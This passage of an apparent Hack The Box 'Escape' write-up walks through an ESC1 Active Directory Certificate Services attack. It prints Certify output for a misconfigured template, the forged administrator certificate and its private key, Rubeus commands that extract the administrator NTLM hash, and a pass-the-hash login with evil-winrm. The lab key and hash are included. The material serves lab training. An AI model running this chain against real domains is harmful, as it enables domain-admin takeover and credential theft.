+</span></span><span style="display:flex;"><span>    FullName                      : dc.sequel.htb<span style="color:#ae81ff">\s</span>equel-DC-CA
+</span></span><span style="display:flex;"><span>    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+</span></span><span style="display:flex;"><span>    Cert SubjectName              : CN<span style="color:#f92672">=</span>sequel-DC-CA, DC<span style="color:#f92672">=</span>sequel, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
+</span></span><span style="display:flex;"><span>    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
+</span></span><span style="display:flex;"><span>    Cert Start Date               : 11/18/2022 12:58:46 PM
+</span></span><span style="display:flex;"><span>    Cert End Date                 : 11/18/2121 1:08:46 PM
+</span></span><span style="display:flex;"><span>    Cert Chain                    : CN<span style="color:#f92672">=</span>sequel-DC-CA,DC<span style="color:#f92672">=</span>sequel,DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span>    UserSpecifiedSAN              : Disabled
+</span></span><span style="display:flex;"><span>    CA Permissions                :
+</span></span><span style="display:flex;"><span>      Owner: BUILTIN<span style="color:#ae81ff">\A</span>dministrators        S-1-5-32-544
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      Access Rights                                     Principal
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      Allow  Enroll                                     NT AUTHORITY<span style="color:#ae81ff">\A</span>uthenticated UsersS-1-5-11
+</span></span><span style="display:flex;"><span>      Allow  ManageCA, ManageCertificates               BUILTIN<span style="color:#ae81ff">\A</span>dministrators        S-1-5-32-544
+</span></span><span style="display:flex;"><span>      Allow  ManageCA, ManageCertificates               sequel<span style="color:#ae81ff">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+</span></span><span style="display:flex;"><span>      Allow  ManageCA, ManageCertificates               sequel<span style="color:#ae81ff">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+</span></span><span style="display:flex;"><span>    Enrollment Agent Restrictions : None
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Vulnerable Certificates Templates :
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    CA Name                               : dc.sequel.htb<span style="color:#ae81ff">\s</span>equel-DC-CA
+</span></span><span style="display:flex;"><span>    Template Name                         : UserAuthentication
+</span></span><span style="display:flex;"><span>    Schema Version                        : <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    Validity Period                       : <span style="color:#ae81ff">10</span> years
+</span></span><span style="display:flex;"><span>    Renewal Period                        : <span style="color:#ae81ff">6</span> weeks
+</span></span><span style="display:flex;"><span>    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
+</span></span><span style="display:flex;"><span>    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
+</span></span><span style="display:flex;"><span>    Authorized Signatures Required        : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
+</span></span><span style="display:flex;"><span>    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
+</span></span><span style="display:flex;"><span>    Permissions
+</span></span><span style="display:flex;"><span>      Enrollment Permissions
+</span></span><span style="display:flex;"><span>        Enrollment Rights           : sequel<span style="color:#ae81ff">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\D</span>omain Users           S-1-5-21-4078382237-1492182817-2568127209-513
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+</span></span><span style="display:flex;"><span>      Object Control Permissions
+</span></span><span style="display:flex;"><span>        Owner                       : sequel<span style="color:#ae81ff">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+</span></span><span style="display:flex;"><span>        WriteOwner Principals       : sequel<span style="color:#ae81ff">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+</span></span><span style="display:flex;"><span>        WriteDacl Principals        : sequel<span style="color:#ae81ff">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+</span></span><span style="display:flex;"><span>        WriteProperty Principals    : sequel<span style="color:#ae81ff">\A</span>dministrator          S-1-5-21-4078382237-1492182817-2568127209-500
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\D</span>omain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
+</span></span><span style="display:flex;"><span>                                      sequel<span style="color:#ae81ff">\E</span>nterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Certify completed in 00:00:10.4261326
+</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="esc1-attack">ESC1 Attack</h3>
+<p>Based on our results from <code>Certipy.exe</code>, we can see that this server is vulnerable to an <a href="https://www.nccgroup.com/us/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/" target="_blank">ESC1</a> attack.</p>
+<blockquote>
+<p>Attackers exploit misconfigured certificate templates that grant excessive permissions. These templates allow low privilege users to request certificates that impersonate high-privileged accounts, such as domain administrators leading to privilege escalation because attackers can request certificates that allow them to authenticate with elevated privileges.</p></blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>yan.Cooper<span style="color:#ae81ff">\D</span>esktop&gt; .<span style="color:#ae81ff">\C</span>ertify.exe request /ca:dc.sequel.htb<span style="color:#ae81ff">\s</span>equel-DC-CA /template:UserAuthentication /altname:administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   _____          _   _  __
+</span></span><span style="display:flex;"><span>  / ____|        | | <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>/ _|
+</span></span><span style="display:flex;"><span> | |     ___ _ __| |_ _| |_ _   _
+</span></span><span style="display:flex;"><span> | |    / _ <span style="color:#ae81ff">\ </span><span style="color:#960050;background-color:#1e0010">&#39;</span>__| __| |  _| | | |
+</span></span><span style="display:flex;"><span> | |___|  __/ |  | |_| | | | |_| |
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\_</span>____<span style="color:#ae81ff">\_</span>__|_|   <span style="color:#ae81ff">\_</span>_|_|_|  <span style="color:#ae81ff">\_</span>_, |
+</span></span><span style="display:flex;"><span>                             __/ |
+</span></span><span style="display:flex;"><span>                            |___./
+</span></span><span style="display:flex;"><span>  v1.0.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Action: Request a Certificates
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current user context    : sequel<span style="color:#ae81ff">\R</span>yan.Cooper
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No subject name specified, using current context as subject.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Template                : UserAuthentication
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Subject                 : CN<span style="color:#f92672">=</span>Ryan.Cooper, CN<span style="color:#f92672">=</span>Users, DC<span style="color:#f92672">=</span>sequel, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> AltName                 : administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate Authority   : dc.sequel.htb<span style="color:#ae81ff">\s</span>equel-DC-CA
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> CA Response             : The certificate had been issued.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID              : <span style="color:#ae81ff">13</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> cert.pem         :
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>MIIEpAIBAAKCAQEA35IURerdyKnNkeFyaUqGlh4xtpL2zLONfWLstoVgQ3way4w0
+</span></span><span style="display:flex;"><span>sbrcjZTlN8Gy+/6WYey9oiAmjASuQ2P7e/Pf2AsrbfH8RSFzI4YS1MfXsUE+4XDT
+</span></span><span style="display:flex;"><span>893ErYEpaPaPP8tcO/DijSnCJ3u/ZTsZbsGyu2J1+3mXCPR5qeJ0alVF9nOJHyHY
+</span></span><span style="display:flex;"><span>gUHb+tGFhazmBhY5tyY3jZdV0ObFSOK8Pfv8hXsQ88juuAwa330FLhoaYENArrx4
+</span></span><span style="display:flex;"><span>4y9TC0zKdkZmKmsoj60d6Gfho4UNuc3NaF4rZYKywVpyegOP3v7vuJKn1eJpljmv
+</span></span><span style="display:flex;"><span>AV7NE+H5HWffsVOUzl6et3YXiGSs5Ny0g7Cv7QIDAQABAoIBAE+ope6Pk7xmvCdJ
+</span></span><span style="display:flex;"><span>U9GuSyv70CzESol/RF+zurIB7d29v3JdH31gHiuYLN/j9VkSShTUHHFC0Vk8Zbb/
+</span></span><span style="display:flex;"><span>TeDJcS1yNWQ0P3WGSJcUs2r7VaADplr/L5YJo4VKqy2KBFpvpAp7ds1jXplg3z47
+</span></span><span style="display:flex;"><span>g4FSJNPdbjpPBYCcUykz1dT5UzdPInvGhcFeBrM4le9qm8n7Zdi/pjxNnkFUqhGR
+</span></span><span style="display:flex;"><span>7CfIOfFKWtYTA/FXvYtlI+lsfafVwDqb4llHSebgSn4JonFrBHxAynfIsvCD98Va
+</span></span><span style="display:flex;"><span>Mx9HJba0yLeX9oPZAyHTpPeKItkWOe4BSaTsVOLBpzRyPJV6tD2XgAKc/kYbmDa9
+</span></span><span style="display:flex;"><span>7/c8G0UCgYEA/Y7aJy+BnLxPvJydSY3gMvbfz5hEM0MQDS4N+QUOeMqp/kYD4Ci5
+</span></span><span style="display:flex;"><span>NTwMkjCTOUKb0o42uL4tuQp1Ou+AWlrmRxSDG6ZkeUk7aYGC6Q58GJWJynbPBBkZ
+</span></span><span style="display:flex;"><span>BG4ApRqwJVinvesuKGe/EIuPm/MZ0tX2k2iwMKaZ5on7GW84S0Vxbr8CgYEA4blL
+</span></span><span style="display:flex;"><span>BQYm0TzIWk2p5J9WHgj/vOl/RDNRLER9t+aUXYzr+Z+S+iSAqIoYkLzzG0K84mMW
+</span></span><span style="display:flex;"><span>3rU9u3udsXb2oSOJEdvB1xnG3H5j5++FBjYCQBd6tMhDKTmpk9GoXV9k0v0t1SOd
+</span></span><span style="display:flex;"><span>eIVogZ2d/7yD6We+NSaf0gmR0Zo+ZlIWT2xQOFMCgYEA+wwNgu7ObdklOaH3OXR3
+</span></span><span style="display:flex;"><span>nv4/6tLf88FaizImM4CGK6K9XT0FaVPozISADd56Zh9FGNwl4hSqQKPSHmAzvUJy
+</span></span><span style="display:flex;"><span>7b2pch71LAEOChBpBUeKJu0oWIX5whz3YCNqEA60iMWWj7vjH65YxpDnx4iS8OVY
+</span></span><span style="display:flex;"><span>Fet5RzIs/s1vCGfOXPiMrxECgYASjrVIOHVAhorCQdhR33epCHxd/6Ri6wUlaowb
+</span></span><span style="display:flex;"><span>bm2MM2XDJAdlYVLiiFf0rlQeTaJRymu665OjskoIqQslvFIskbCiCpB62DlGfD6n
+</span></span><span style="display:flex;"><span>gBE3S7be3ggHf6IdcQMyigE0B3SZLVBo9C7fWSIAQHNn4QuWOxKwpfDDFrdCmkUT
+</span></span><span style="display:flex;"><span>Sohd2QKBgQCl4Tl44rg2meMMxfk66NePx348qv6rUtCPuL0S7f4sBh2tzW+bbooL
+</span></span><span style="display:flex;"><span>wpnaembTbbd1uRIgQTg09wse/LAthAUAbg0F3HpIYgKPTeEp1mhrppFWBJ1oQziN
+</span></span><span style="display:flex;"><span>xYwBYmhZDBJq0HGsii9OiwpTzh1bBAEabDO/7CCY1MWRT+xuXtMPhw<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END RSA PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>-----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>MIIGEjCCBPqgAwIBAgITHgAAAA2ss43v9xnSgAAAAAAADTANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
+</span></span><span style="display:flex;"><span>MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUwMjEzMDQyNzI1WhcNMzUwMjEx
+</span></span><span style="display:flex;"><span>MDQyNzI1WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
+</span></span><span style="display:flex;"><span>c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
+</span></span><span style="display:flex;"><span>MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDfkhRF6t3Iqc2R4XJpSoaWHjG2
+</span></span><span style="display:flex;"><span>kvbMs419Yuy2hWBDfBrLjDSxutyNlOU3wbL7/pZh7L2iICaMBK5DY/t789/YCytt
+</span></span><span style="display:flex;"><span>8fxFIXMjhhLUx9exQT7hcNPz3cStgSlo9o8/y1w78OKNKcIne79lOxluwbK7YnX7
+</span></span><span style="display:flex;"><span>eZcI9Hmp4nRqVUX2c4kfIdiBQdv60YWFrOYGFjm3JjeNl1XQ5sVI4rw9+/yFexDz
+</span></span><span style="display:flex;"><span>yO64DBrffQUuGhpgQ0CuvHjjL1MLTMp2RmYqayiPrR3oZ+GjhQ25zc1oXitlgrLB
+</span></span><span style="display:flex;"><span>WnJ6A4/e/u+4kqfV4mmWOa8BXs0T4fkdZ9+xU5TOXp63dheIZKzk3LSDsK/tAgMB
+</span></span><span style="display:flex;"><span>AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
+</span></span><span style="display:flex;"><span>lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
+</span></span><span style="display:flex;"><span>KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
+</span></span><span style="display:flex;"><span>CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
+</span></span><span style="display:flex;"><span>hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
+</span></span><span style="display:flex;"><span>Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFORtk6K4+zC/gd+nyd+p3fcF50Ik
+</span></span><span style="display:flex;"><span>MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
+</span></span><span style="display:flex;"><span>IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
+</span></span><span style="display:flex;"><span>gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
+</span></span><span style="display:flex;"><span>bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
+</span></span><span style="display:flex;"><span>bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
+</span></span><span style="display:flex;"><span>ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
+</span></span><span style="display:flex;"><span>gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
+</span></span><span style="display:flex;"><span>QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
+</span></span><span style="display:flex;"><span>bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
+</span></span><span style="display:flex;"><span>b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
+</span></span><span style="display:flex;"><span>AAOCAQEAdXMkBxIp0tPWrGpVh/8jb8oKERZRZKHMnovRIiRh1+rrVEcVYHKzxPDE
+</span></span><span style="display:flex;"><span>1ecnQC7PM/o1USO6Uggb5DM2ojlVSFhGjrh8CX6skJSkbkMm2UvCWp3VbJXPiVXw
+</span></span><span style="display:flex;"><span>W1bv/F9Y5FNxK2ETtxyCz24FPV8LiI3M+kZlHIunU7HTdQdl1fDncQdQvs9ec+NI
+</span></span><span style="display:flex;"><span>emH5srIBY0jIEe2P7tSMYRT3EwvUsohzthwEphia+fK68ltpKx/AlZGDwjlyAa6f
+</span></span><span style="display:flex;"><span>3y2qzTosQDtdDnb2Vr0dtNR4Ky/fWgKKQPpBr4KDiG0cqmC/huV9NU27XflxroEM
+</span></span><span style="display:flex;"><span>RZud9Ji9JH3w7jPuiTxsMBBJxE6ncw<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Convert with: openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Certify completed in 00:00:13.4902574
+</span></span></code></pre></div><p>We can copy the entire block (<code>RSA PRIVATE KEY</code> + <code>CERTIFICATE</code>) into a file back on our Kali machine: <code>cert.pem</code>, then run the following command to generate the <code>.pfx</code> certificate.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ openssl pkcs12 -in cert.pem -keyex -CSP <span style="color:#e6db74">&#34;Microsoft Enhanced Cryptographic Provider v1.0&#34;</span> -export -out cert.pfx
+</span></span></code></pre></div><p>Now let&rsquo;s transfer that certificate back to the victim machine, and use it to request a Kerberos ticket for <code>administrator</code>. By appending <code>/getcredentials</code> to the command, it will provide us the NTLM hash for the <code>Administrator</code> account.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\R</span>yan.Cooper<span style="color:#ae81ff">\D</span>esktop&gt; .<span style="color:#ae81ff">\R</span>ubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /show /nowrap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   ______        _
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">(</span>_____ <span style="color:#ae81ff">\ </span>     | |
+</span></span><span style="display:flex;"><span>   _____<span style="color:#f92672">)</span> <span style="color:#f92672">)</span>_   _| |__  _____ _   _  ___
+</span></span><span style="display:flex;"><span>  |  __  /| | | |  _ <span style="color:#ae81ff">\|</span> ___ | | | |/___<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  | |  <span style="color:#ae81ff">\ \|</span> |_| | |_<span style="color:#f92672">)</span> <span style="color:#f92672">)</span> ____| |_| |___ |
+</span></span><span style="display:flex;"><span>  |_|   |_|____/|____/|_____<span style="color:#f92672">)</span>____/<span style="color:#f92672">(</span>___/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  v2.2.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Action: Ask TGT
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using PKINIT with etype rc4_hmac and subject: CN<span style="color:#f92672">=</span>Ryan.Cooper, CN<span style="color:#f92672">=</span>Users, DC<span style="color:#f92672">=</span>sequel, DC<span style="color:#f92672">=</span>htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Building AS-REQ <span style="color:#f92672">(</span>w/ PKINIT preauth<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span>: <span style="color:#e6db74">&#39;sequel.htb\administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using domain controller: fe80::9916:5866:792d:73db%4:88
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> TGT request successful!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> base64<span style="color:#f92672">(</span>ticket.kirbi<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBNw3/ltLdLHc95cKRR9+MdwShMWAcxn5uwQFrWzWjb+y9F4c8hgCy+V7dYhi8vLeqFd15zWs6CjeTaA+pOPTJmWAMNci/xoPEDmT8Nnb4gho6PbrF7UYWhYHTz41GsF5svxVlQrhtS/oefLVWh/6U9IAeU4Us+83D+r4dBbjDHN97uhJS5cSBOkRvyLkkYmh8d9FoQoq47quoPd372Jl1w8UtZkQXoWCUF6AU7pSaHcIoRBXyoyZqTqW3yBoUXxtMLptLMwjRWVDtcO7R6vUZ7ofW38QUwhLcEMEPBM3rXqpL6bQuOlQ5apftdDw2/WR3OYJkEaFhXq+Ihjbzw3nFWHYf+0yBi2hqi3CrAfWc7NRebI1GpmCVEOGap8Q58hicHak+pO5GN+VRxNqQ36aNmq3++ABnyrk/lPOxTTLF6hmAjSEOONG9q2KSnvgDp3EC8boOMlMmAdIkbE6U3LHXow0B2v2Lqmn9fiDZ+Oh9WxzRyTL5KL90CvX5+DObBv55dYiixAcIwhhnW6iXqmIhne4oD/AwpWDsGmAq++x4nvzBsJq92hgvIQpzK98I1e1px4XrtqWvmCiOm4OmysAsP2unIUymy08LiYCl6JQIMRSUN1CSiKaq0v/qirm9LnoEYqj3n95Xem1hJkcWwRx/f5h5QsHAoAumPj3QGG76cZ1ZvojShyclZ5eQVQwDcfXv4Jhr1IZ5r+fNX+B9o8hT5VIaO8wwQp0vdsuaIwZoSlxbwsvtDLNgUAnWoBa3JrCRm2Q5DgtYLrPzoFVqSSZqf+0qN1BVpgeigU9CwH1yZNBP6s6jKxOHHRaGRuyaCHbgtxBgJGk754ic0zFsWMt2vM8ohb/g08kFIsTQHIh7JkPEVYy0pvlPuURzaYPKpbPJWdQrkfB82iKf4FUN3bWLU4YUmh7EdyCEXWBhPwxu3UFDIm4Q4UNbWzpxe8Ig7fqgo9Jd+a/Bjz/1xwQ7gFayP00uUa8fAflHEgM9WJNAIVCeqntI23lmvg0SWmHI7iaZv72xtKcFNEqsMbOVlmi8L8i5Ld4+Q6DuHtO7cSXTaq/QNax+eXWJFwRALRgfadxKFeACINq/68MZFgIzipENcfW76qSaf+cmKjY1pm4KXlvgkgxI9l+gc9Pn672LCvudZtNdEnyhE3M0K+cAIbM/tTmNupziCXUGKigLcooKFbD5DCyWmyAZZf57NUxF+ZfGTfg5FlW5ed3Lu0owpm/FMh6AFkY0+wXQ9TV9juKP1OghvY86h/ctCzcLeJoRcAO/m5NPBpGMfv7tdqYPtFpItL2Ig712osgo78+gsnjWRTyV0LPx9kmM+VIAaQ33hb+m739k3v/8kEIymtjHMDbQZgT3tv0JA9GeSSYx2VfbxK3QN/MdCUf6dxTIfTdu/vRjTO8uMdxVUz9etYYSHLOS3KfiKOZquM3OZQ181ORP8uyrFa6bO9OYGkRoWx/OMj4/zSFM2hlxuZBF7THaYaTgqGnHqR4geb9KADt3xCATwHlahm0mLI21wQJimyAKbMHwhYSQiTZ5na+pS3fPlnsu5qTEl06LB2qmtV5JBbvOeOSAp/8q0bj3rXAu5OzLUhVb00AxQ+OTwFrGtf6XoMf7dH8J2LEW/lRRX6yqK9pFrpkw6XESjWzBIgG0yN5Z8uPOblSW7F5WVhjfmJgDcvxJzVKalWuKU8xxop88pxOekH4QSy82aOB1TCB0qADAgEAooHKBIHHfYHEMIHBoIG+MIG7MIG4oBswGaADAgEXoRIEECZ68fkmP+7YdyUFvd35m7ChDBsKU0VRVUVMLkhUQqIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAADhAAClERgPMjAyNTAyMTMwNDUxMDlaphEYDzIwMjUwMjEzMTQ1MTA5WqcRGA8yMDI1MDIyMDA0NTEwOVqoDBsKU0VRVUVMLkhUQqkfMB2gAwIBAqEWMBQbBmtyYnRndBsKc2VxdWVsLmh0Yg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  ServiceName              :  krbtgt/sequel.htb
+</span></span><span style="display:flex;"><span>  ServiceRealm             :  SEQUEL.HTB
+</span></span><span style="display:flex;"><span>  UserName                 :  administrator
+</span></span><span style="display:flex;"><span>  UserRealm                :  SEQUEL.HTB
+</span></span><span style="display:flex;"><span>  StartTime                :  2/12/2025 8:51:09 PM
+</span></span><span style="display:flex;"><span>  EndTime                  :  2/13/2025 6:51:09 AM
+</span></span><span style="display:flex;"><span>  RenewTill                :  2/19/2025 8:51:09 PM
+</span></span><span style="display:flex;"><span>  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+</span></span><span style="display:flex;"><span>  KeyType                  :  rc4_hmac
+</span></span><span style="display:flex;"><span>  Base64<span style="color:#f92672">(</span>key<span style="color:#f92672">)</span>              :  Jnrx+SY/7th3JQW93fmbsA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>  ASREP <span style="color:#f92672">(</span>key<span style="color:#f92672">)</span>              :  80CB5A98EE36CB0AB78D2DB6CA8D2EFC
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting credentials using U2U
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  CredentialInfo         :
+</span></span><span style="display:flex;"><span>    Version              : <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    EncryptionType       : rc4_hmac
+</span></span><span style="display:flex;"><span>    CredentialData       :
+</span></span><span style="display:flex;"><span>      CredentialCount    : <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+</span></span></code></pre></div><h3 id="pass-the-hash">Pass the Hash</h3>
+<p>With the hash for the administrator account, we can go ahead and get a WinRM shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/escape<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i 10.129.228.253 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.7
+</span></span><span style="display:flex;"><span>                                        
